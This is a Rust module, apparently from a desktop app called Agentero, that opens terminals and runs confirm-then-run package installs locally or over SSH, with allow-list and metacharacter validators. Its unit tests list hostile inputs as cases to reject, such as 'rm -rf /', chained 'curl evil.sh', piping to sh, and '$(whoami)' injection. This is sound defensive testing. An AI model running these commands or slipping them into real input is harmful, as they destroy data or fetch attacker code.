//! Open the system default terminal at a local path, or with a confirm-then-run command.

use crate::error::AppError;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

/// Resolve the directory to open: folders stay as-is; files use their parent.
pub fn terminal_cwd_for_path(path: &Path) -> Result<PathBuf, AppError> {
    if path.as_os_str().is_empty() {
        return Err(AppError::message("path is required"));
    }
    let meta = std::fs::metadata(path)
        .map_err(|e| AppError::message(format!("path not found ({}): {e}", path.display())))?;
    if meta.is_dir() {
        return Ok(path.to_path_buf());
    }
    path.parent()
        .filter(|p| !p.as_os_str().is_empty())
        .map(Path::to_path_buf)
        .ok_or_else(|| AppError::message("cannot resolve parent directory"))
}

/// Open the system default terminal with cwd at `path` (or its parent if a file).
pub fn open_in_terminal(path: &Path) -> Result<PathBuf, AppError> {
    let cwd = terminal_cwd_for_path(path)?;
    open_terminal_at(&cwd)?;
    Ok(cwd)
}

/// Package managers allowed as the first token of a guided install command.
/// Install commands are Host-registered template strings, never free-form UI
/// input; this allow-list is defense in depth against unexpected callers.
const INSTALL_COMMAND_BINS: &[&str] = &[
    "npm", "npx", "pnpm", "yarn", "brew", "cargo", "pip", "pip3", "pipx", "uv",
];

/// Validate a guided install command: known package-manager first token and
/// no shell metacharacters that allow chaining or substitution. Plain `$VAR`
/// expansion (e.g. `--prefix "$HOME/.local"`) stays allowed; `$(…)`, backticks,
/// `;`, `&&`, `|`, redirects and brace expansion are rejected.
fn validate_install_command(command: &str) -> Result<(), AppError> {
    let first = command.split_whitespace().next().unwrap_or_default();
    if !INSTALL_COMMAND_BINS.contains(&first) {
        return Err(AppError::message(format!(
            "install command must start with a known package manager ({})",
            INSTALL_COMMAND_BINS.join(", ")
        )));
    }
    let disallowed = |c: char| {
        matches!(
            c,
            ';' | '&' | '|' | '<' | '>' | '(' | ')' | '`' | '{' | '}' | '\\' | '\n' | '\r'
        )
    };
    if command.chars().any(disallowed) {
        return Err(AppError::message(
            "install command contains disallowed characters",
        ));
    }
    Ok(())
}

/// Validate an SSH destination (`host` / `user@host`): conservative charset,
/// no whitespace or shell metacharacters.
fn validate_ssh_destination(destination: &str) -> Result<(), AppError> {
    let ok = !destination.is_empty()
        && destination
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '@' | '.' | '-' | '_' | ':'));
    if !ok {
        return Err(AppError::message(
            "SSH destination contains disallowed characters",
        ));
    }
    Ok(())
}

/// Open a system terminal that prints `command`, waits for Enter (or Ctrl+C), then runs it.
///
/// Used for guided installs (e.g. Claude ACP adapter). The shell never auto-runs without
/// confirmation. Only trusted Host-side callers should pass commands.
pub fn open_terminal_confirm_command(command: &str) -> Result<(), AppError> {
    let command = command.trim();
    if command.is_empty() {
        return Err(AppError::message("install command is required"));
    }
    validate_install_command(command)?;

    #[cfg(windows)]
    {
        open_terminal_confirm_command_windows(command)
    }
    #[cfg(not(windows))]
    {
        open_terminal_confirm_command_unix(command)
    }
}

/// Guided install on a remote host via interactive SSH (same Enter-to-confirm UX).
///
/// Opens the system terminal; after Enter runs:
/// `ssh -t <destination> -- bash -lc '<install_command>'`
/// so npm/global installs land on the **server** PATH (login shell).
pub fn open_terminal_confirm_remote_install(
    destination: &str,
    install_command: &str,
) -> Result<(), AppError> {
    let destination = destination.trim();
    let install_command = install_command.trim();
    if destination.is_empty() {
        return Err(AppError::message("SSH destination is required"));
    }
    if install_command.is_empty() {
        return Err(AppError::message("install command is required"));
    }
    validate_ssh_destination(destination)?;
    validate_install_command(install_command)?;

    #[cfg(windows)]
    {
        // Single remote command string so the whole npm line is the -c payload.
        let command = format!("ssh -t {destination} -- \"bash -lc {install_command:?}\"");
        open_terminal_confirm_command_windows(&command)
    }
    #[cfg(not(windows))]
    {
        open_terminal_confirm_remote_install_unix(destination, install_command)
    }
}

#[cfg(not(windows))]
fn open_terminal_confirm_remote_install_unix(
    destination: &str,
    install_command: &str,
) -> Result<(), AppError> {
    let dir = std::env::temp_dir().join("agentero-install");
    fs::create_dir_all(&dir)
        .map_err(|e| AppError::message(format!("failed to create temp dir: {e}")))?;
    let path = dir.join(format!("remote-install-{}.sh", std::process::id()));
    let dest_q = destination.replace('\'', "'\\''");
    let cmd_q = install_command.replace('\'', "'\\''");
    // Important: `ssh host bash -lc "$CMD"` is wrong — OpenSSH joins remote args and the
    // remote shell re-splits, so only `npm` runs and `i -g …` is lost. Pass a *single*
    // remote command string with the -c payload properly quoted via printf %q.
    let body = format!(
        r#"#!/usr/bin/env bash
set +e
DEST='{dest_q}'
CMD='{cmd_q}'
echo ""
echo "Agentero — remote install helper"
echo "Host:  $DEST"
echo "Command (on remote login shell):"
echo "  $CMD"
echo ""
printf '%s' "Press Enter to SSH and run, or Ctrl+C to cancel… "
read -r _
echo ""
echo "Connecting…"
# -t: allocate PTY so npm can prompt; bash -lc loads nvm / ~/.local/bin PATH.
# Local expansion builds one remote command; %q keeps spaces in the -c script.
# (Do NOT use: ssh host bash -lc "$CMD" — remote re-splits and only runs `npm`.)
ssh -t "$DEST" "bash -lc $(printf '%q' "$CMD")"
status=$?
echo ""
if [ "$status" -eq 0 ]; then
  echo "Done. Verifying on remote…"
  ssh -T "$DEST" "bash -lc $(printf '%q' 'command -v claude-agent-acp || command -v opencode || true; ls -la \"$HOME/.local/bin\" 2>/dev/null | head -20')" || true
  echo ""
  echo "Return to Agentero → Settings → Agent and click Refresh."
else
  echo "Command exited with status $status."
  echo "Tip: if npm needs a writable prefix, use:"
  echo "  npm i -g @agentclientprotocol/claude-agent-acp --prefix \"\$HOME/.local\""
fi
echo "You can close this window."
"#
    );
    fs::write(&path, body)
        .map_err(|e| AppError::message(format!("failed to write install script: {e}")))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = fs::metadata(&path)
            .map_err(|e| AppError::message(format!("failed to stat install script: {e}")))?
            .permissions();
        perms.set_mode(0o700);
        fs::set_permissions(&path, perms)
            .map_err(|e| AppError::message(format!("failed to chmod install script: {e}")))?;
    }

    let script = path.to_string_lossy().replace('\'', "'\\''");
    #[cfg(target_os = "macos")]
    {
        let apple = format!("tell application \"Terminal\" to do script \"bash '{script}'\"");
        let status = Command::new("osascript")
            .arg("-e")
            .arg(&apple)
            .status()
            .map_err(|e| AppError::message(format!("failed to open Terminal: {e}")))?;
        if !status.success() {
            return Err(AppError::message(format!(
                "failed to open Terminal (exit {status})"
            )));
        }
        let _ = Command::new("osascript")
            .args(["-e", "tell application \"Terminal\" to activate"])
            .status();
        return Ok(());
    }

    #[cfg(all(unix, not(target_os = "macos")))]
    {
        let bash_cmd = format!("bash '{script}'; exec bash");
        if Command::new("xdg-terminal-exec")
            .args(["bash", "-lc", &bash_cmd])
            .spawn()
            .is_ok()
        {
            return Ok(());
        }
        if let Ok(term) = std::env::var("TERMINAL") {
            if !term.is_empty()
                && Command::new(&term)
                    .args(["-e", "bash", "-lc", &bash_cmd])
                    .spawn()
                    .is_ok()
            {
                return Ok(());
            }
        }
        return Err(AppError::message(
            "no terminal emulator found (install xdg-terminal-exec or set $TERMINAL)",
        ));
    }

    #[allow(unreachable_code)]
    Ok(())
}

#[cfg(not(windows))]
fn open_terminal_confirm_command_unix(command: &str) -> Result<(), AppError> {
    let script_path = write_confirm_script_unix(command)?;
    let script = script_path.to_string_lossy().replace('\'', "'\\''");

    #[cfg(target_os = "macos")]
    {
        // Terminal.app: run the script in a new window (user must press Enter to install).
        let apple = format!("tell application \"Terminal\" to do script \"bash '{script}'\"");
        let status = Command::new("osascript")
            .arg("-e")
            .arg(&apple)
            .status()
            .map_err(|e| AppError::message(format!("failed to open Terminal: {e}")))?;
        if !status.success() {
            return Err(AppError::message(format!(
                "failed to open Terminal (exit {status})"
            )));
        }
        // Bring Terminal to front.
        let _ = Command::new("osascript")
            .args(["-e", "tell application \"Terminal\" to activate"])
            .status();
        return Ok(());
    }

    #[cfg(all(unix, not(target_os = "macos")))]
    {
        let bash_cmd = format!("bash '{script}'; exec bash");
        if Command::new("xdg-terminal-exec")
            .args(["bash", "-lc", &bash_cmd])
            .spawn()
            .is_ok()
        {
            return Ok(());
        }
        if let Ok(term) = std::env::var("TERMINAL") {
            if !term.is_empty()
                && Command::new(&term)
                    .args(["-e", "bash", "-lc", &bash_cmd])
                    .spawn()
                    .is_ok()
            {
                return Ok(());
            }
        }
        let candidates: &[(&str, fn(&str) -> Command)] = &[
            ("gnome-terminal", |c| {
                let mut cmd = Command::new("gnome-terminal");
                cmd.args(["--", "bash", "-lc", c]);
                cmd
            }),
            ("konsole", |c| {
                let mut cmd = Command::new("konsole");
                cmd.args(["-e", "bash", "-lc", c]);
                cmd
            }),
            ("xfce4-terminal", |c| {
                let mut cmd = Command::new("xfce4-terminal");
                cmd.args(["-e", &format!("bash -lc {c:?}")]);
                cmd
            }),
            ("alacritty", |c| {
                let mut cmd = Command::new("alacritty");
                cmd.args(["-e", "bash", "-lc", c]);
                cmd
            }),
            ("kitty", |c| {
                let mut cmd = Command::new("kitty");
                cmd.args(["bash", "-lc", c]);
                cmd
            }),
            ("x-terminal-emulator", |c| {
                let mut cmd = Command::new("x-terminal-emulator");
                cmd.args(["-e", "bash", "-lc", c]);
                cmd
            }),
        ];
        for (bin, build) in candidates {
            if build(&bash_cmd).spawn().is_ok() {
                let _ = bin;
                return Ok(());
            }
        }
        return Err(AppError::message(
            "no terminal emulator found (install xdg-terminal-exec or set $TERMINAL)",
        ));
    }

    #[allow(unreachable_code)]
    Ok(())
}

#[cfg(not(windows))]
fn write_confirm_script_unix(command: &str) -> Result<PathBuf, AppError> {
    let dir = std::env::temp_dir().join("agentero-install");
    fs::create_dir_all(&dir)
        .map_err(|e| AppError::message(format!("failed to create temp dir: {e}")))?;
    let path = dir.join(format!("install-{}.sh", std::process::id()));
    // Single-quoted shell literal for the command display/run.
    let quoted = command.replace('\'', "'\\''");
    let body = format!(
        r#"#!/usr/bin/env bash
set +e
echo ""
echo "Agentero — install helper"
echo "Command:"
echo "  {command}"
echo ""
printf '%s' "Press Enter to run, or Ctrl+C to cancel… "
read -r _
echo ""
echo "Running…"
bash -lc '{quoted}'
status=$?
echo ""
if [ "$status" -eq 0 ]; then
  echo "Done. Return to Agentero → Settings → Agent and click Refresh."
else
  echo "Command exited with status $status."
fi
echo "You can close this window."
"#
    );
    fs::write(&path, body)
        .map_err(|e| AppError::message(format!("failed to write install script: {e}")))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = fs::metadata(&path)
            .map_err(|e| AppError::message(format!("failed to stat install script: {e}")))?
            .permissions();
        perms.set_mode(0o700);
        fs::set_permissions(&path, perms)
            .map_err(|e| AppError::message(format!("failed to chmod install script: {e}")))?;
    }
    Ok(path)
}

#[cfg(windows)]
fn open_terminal_confirm_command_windows(command: &str) -> Result<(), AppError> {
    let dir = std::env::temp_dir().join("agentero-install");
    fs::create_dir_all(&dir)
        .map_err(|e| AppError::message(format!("failed to create temp dir: {e}")))?;
    let path = dir.join(format!("install-{}.cmd", std::process::id()));
    // Escape ^ and & for cmd.exe display; the install command itself is simple npm.
    let body = format!(
        "@echo off\r\n\
echo.\r\n\
echo Agentero - install helper\r\n\
echo Command:\r\n\
echo   {command}\r\n\
echo.\r\n\
echo Press any key to run, or close this window to cancel...\r\n\
pause >nul\r\n\
echo.\r\n\
echo Running...\r\n\
{command}\r\n\
set STATUS=%ERRORLEVEL%\r\n\
echo.\r\n\
if %STATUS%==0 (\r\n\
  echo Done. Return to Agentero Settings - Agent and click Refresh.\r\n\
) else (\r\n\
  echo Command exited with status %STATUS%.\r\n\
)\r\n\
echo You can close this window.\r\n\
pause\r\n"
    );
    fs::write(&path, body)
        .map_err(|e| AppError::message(format!("failed to write install script: {e}")))?;

    if Command::new("wt")
        .args(["-d", "%USERPROFILE%", "cmd", "/K"])
        .arg(&path)
        .spawn()
        .is_ok()
    {
        return Ok(());
    }
    Command::new("cmd")
        .args(["/C", "start", "", "cmd", "/K"])
        .arg(&path)
        .spawn()
        .map_err(|e| AppError::message(format!("failed to open terminal: {e}")))?;
    Ok(())
}

#[cfg(target_os = "macos")]
fn open_terminal_at(cwd: &Path) -> Result<(), AppError> {
    // Terminal.app is the system default terminal on macOS.
    // `open -a Terminal <dir>` opens a new window with that directory as cwd.
    let status = Command::new("open")
        .args(["-a", "Terminal"])
        .arg(cwd)
        .status()
        .map_err(|e| AppError::message(format!("failed to open Terminal: {e}")))?;
    if !status.success() {
        return Err(AppError::message(format!(
            "failed to open Terminal (exit {status})"
        )));
    }
    Ok(())
}

#[cfg(target_os = "windows")]
fn open_terminal_at(cwd: &Path) -> Result<(), AppError> {
    // Prefer Windows Terminal when available (often the system default on Win11).
    if Command::new("wt").arg("-d").arg(cwd).spawn().is_ok() {
        return Ok(());
    }
    // Fallback: classic cmd in a new window, cwd set via /K cd.
    let cd = format!("cd /d {}", cwd.display());
    Command::new("cmd")
        .args(["/C", "start", "", "cmd", "/K", &cd])
        .spawn()
        .map_err(|e| AppError::message(format!("failed to open terminal: {e}")))?;
    Ok(())
}

#[cfg(all(unix, not(target_os = "macos")))]
fn open_terminal_at(cwd: &Path) -> Result<(), AppError> {
    // FreeDesktop default terminal launcher (when installed).
    if Command::new("xdg-terminal-exec")
        .current_dir(cwd)
        .spawn()
        .is_ok()
    {
        return Ok(());
    }

    // $TERMINAL if the user set it.
    if let Ok(term) = std::env::var("TERMINAL") {
        if !term.is_empty() && Command::new(&term).current_dir(cwd).spawn().is_ok() {
            return Ok(());
        }
    }

    // Common desktop terminals.
    let candidates: &[(&str, &[&str])] = &[
        ("gnome-terminal", &["--working-directory"]),
        ("konsole", &["--workdir"]),
        ("xfce4-terminal", &["--working-directory"]),
        ("mate-terminal", &["--working-directory"]),
        ("tilix", &["--working-directory"]),
        ("alacritty", &["--working-directory"]),
        ("kitty", &["--directory"]),
    ];
    for (bin, flag) in candidates {
        let mut cmd = Command::new(bin);
        if flag.len() == 1 {
            cmd.arg(flag[0]).arg(cwd);
        }
        if cmd.spawn().is_ok() {
            return Ok(());
        }
    }

    // Debian/Ubuntu alternative; cwd via process current_dir when supported.
    if Command::new("x-terminal-emulator")
        .current_dir(cwd)
        .spawn()
        .is_ok()
    {
        return Ok(());
    }

    Err(AppError::message(
        "no terminal emulator found (install xdg-terminal-exec or set $TERMINAL)",
    ))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn cwd_for_directory_is_self() {
        let dir = std::env::temp_dir().join(format!("agentero-term-dir-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        let got = terminal_cwd_for_path(&dir).unwrap();
        assert_eq!(got, dir);
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn cwd_for_file_is_parent() {
        let dir = std::env::temp_dir().join(format!("agentero-term-file-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        let file = dir.join("note.md");
        fs::write(&file, "x").unwrap();
        let got = terminal_cwd_for_path(&file).unwrap();
        assert_eq!(got, dir);
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn install_command_accepts_registered_templates() {
        for cmd in [
            "npm i -g @agentclientprotocol/claude-agent-acp --prefix \"$HOME/.local\"",
            "npm i -g @agentclientprotocol/codex-acp",
            "brew install opencode",
            "pipx install some-tool",
        ] {
            assert!(
                validate_install_command(cmd).is_ok(),
                "should accept: {cmd}"
            );
        }
    }

    #[test]
    fn install_command_rejects_unknown_binaries() {
        for cmd in ["rm -rf /", "curl https://x.sh", "bash -c 'x'", ""] {
            assert!(
                validate_install_command(cmd).is_err(),
                "should reject: {cmd}"
            );
        }
    }

    #[test]
    fn install_command_rejects_shell_metacharacters() {
        for cmd in [
            "npm i -g x; rm -rf /",
            "npm i -g x && curl evil.sh",
            "npm i -g x | sh",
            "npm i -g $(whoami)",
            "npm i -g `whoami`",
            "npm i -g x > /etc/passwd",
            "npm i -g x\ncurl evil.sh",
        ] {
            assert!(
                validate_install_command(cmd).is_err(),
                "should reject: {cmd}"
            );
        }
    }

    #[test]
    fn ssh_destination_charset() {
        for dest in ["host", "user@host.example.com", "user@10.0.0.2", "h-1_2:22"] {
            assert!(
                validate_ssh_destination(dest).is_ok(),
                "should accept: {dest}"
            );
        }
        for dest in ["host; rm -rf /", "host x", "host$(x)", "host`x`", ""] {
            assert!(
                validate_ssh_destination(dest).is_err(),
                "should reject: {dest}"
            );
        }
    }
}
